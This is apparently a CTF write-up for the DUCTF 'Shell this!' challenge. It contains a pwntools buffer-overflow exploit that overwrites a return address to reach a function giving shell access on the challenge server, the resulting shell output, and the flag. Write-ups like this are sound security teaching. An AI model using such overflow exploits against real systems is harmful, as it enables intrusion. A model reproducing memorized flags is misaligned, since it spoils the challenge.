# Shell this!

Author: [roerohan](https://github.com/roerohan)

## Source

```
Author: Faith

Somebody told me that this program is vulnerable to something called remote code execution?

I'm not entirely sure what that is, but could you please figure it out for me?

nc chal.duc.tf 30002
```

## Exploit

```py
from pwn import *

elf = ELF('./shellthis')

host = 'chal.duc.tf'
port = 30002

local = False

if local:
    p = elf.process()
else:
    p = remote(host, port)

print(p.recvuntil('name: '))
p.clean()

target = p64(0x4006ca)

offset = b'a' * (0x30 + 0x8)

payload = offset + target
p.sendline(payload)

print(payload)

p.interactive()
```

```bash
[*] Switching to interactive mode
$ ls
flag.txt
shellthis
$ cat flag.txt
DUCTF{h0w_d1d_you_c4LL_That_funCT10n?!?!?}
```

The flag is:

```
DUCTF{h0w_d1d_you_c4LL_That_funCT10n?!?!?}
```